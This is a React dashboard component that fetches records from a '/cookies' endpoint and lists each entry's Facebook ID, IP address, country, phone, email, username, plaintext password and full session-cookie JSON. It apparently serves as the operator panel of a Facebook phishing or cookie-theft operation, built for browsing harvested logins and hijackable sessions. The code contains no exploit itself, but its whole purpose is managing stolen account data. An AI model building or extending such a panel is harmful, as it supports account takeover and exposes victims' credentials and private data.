import React, { useEffect, useState } from "react"
import { Card, CardBody, CardHeader, CardTitle, Container } from "reactstrap";
import BootstrapTable from "react-bootstrap-table-next";
import paginationFactory from "react-bootstrap-table2-paginator";
import axios from 'axios'
import { BASE_URL } from '../../utils/config'
import moment from 'moment'
import PaginationPage from '../Pagination'

const TableContainer = ({ page, perPage, setPage, setPerPage }) => {

  const [data, setData] = useState([])
  const [total, setTotal] = useState(0)
  const tableColumns = [
    {
      dataField: "facebookId",
      text: "Facebook Id",
    },
    {
      dataField: "ip",
      text: "IP Address",
    },

    {
      dataField: "country",
      text: "Country",
    },
    {
      dataField: "infoRegister",
      text: "InfoRegister",
      formatter: (cell) => {
        return <div>
          <p>{cell.phone ? `Phone: ${cell.phone}` : ""}</p>
          <p>{cell.email ? `Email: ${cell.email}` : ""}</p>
          <p>{cell.username ? `Username:${cell.username}` : ""}</p>
          <p>{cell.password ? `Password:${cell.password}` : ""}</p>
        </div>
      }
    },

    // {
    //   dataField: "facebookId",
    //   text: "Avata",
    //   formatter: (cell) => { return <span>{cell && <img src={`https://graph.facebook.com/${cell}/picture?type=square`} />}</span> }
    // },
    {
      dataField: "cookies",
      text: "Cookies",
      formatter: (cell, row) => { return <div style={{ height: 300, overflowY: "auto" }}>{JSON.stringify(cell)}</div> },
      headerStyle: (colum, colIndex) => {
        return { width: '400px', textAlign: 'center' };
      }
    },

    {
      dataField: "createdAt",
      text: "Time",
      formatter: (cell, row) => { return <span>{moment(cell).format("DD-MM-YYYY")}</span> }
    },

  ];
  const token = localStorage.getItem("token")

  useEffect(() => {
    const config = {
      headers: { Authorization: `Bearer ${token}` }
    };
    axios.get(`${BASE_URL}/cookies?page=${page}&perPage=${perPage.value}`, config)
      // .then(res => setData(() => res.data.data))
      .then(res => {
        setData(res.data.data.data)
        setTotal(res.data.data.total)
      })
      .catch(err => console.log(err))
  }, [])
  useEffect(() => {
    const config = {
      headers: { Authorization: `Bearer ${token}` }
    };
    axios.get(`${BASE_URL}/cookies?page=${page}&perPage=${perPage.value}`, config)
      // .then(res => setData(() => res.data.data))
      .then(res => {
        setData(res.data.data.data)

      })
      .catch(err => console.log(err))
  }, [page, perPage])


  console.log(data)
  return (
    <Card>
      <CardHeader>
        <h4 className="card-subtitle text-muted">
          Manager
        </h4>
      </CardHeader>
      <CardBody>
        <BootstrapTable
          keyField="name"
          data={data ? data : []}
          columns={tableColumns}
          bootstrap4
          bordered={false}
          striped
          hover
          condensed
        // pagination={paginationFactory(options)}
        />
        <PaginationPage page={page} sizePerPage={perPage} setPage={setPage} setPerPage={setPerPage} total={total} />
      </CardBody>
    </Card>
  )
}
export default TableContainer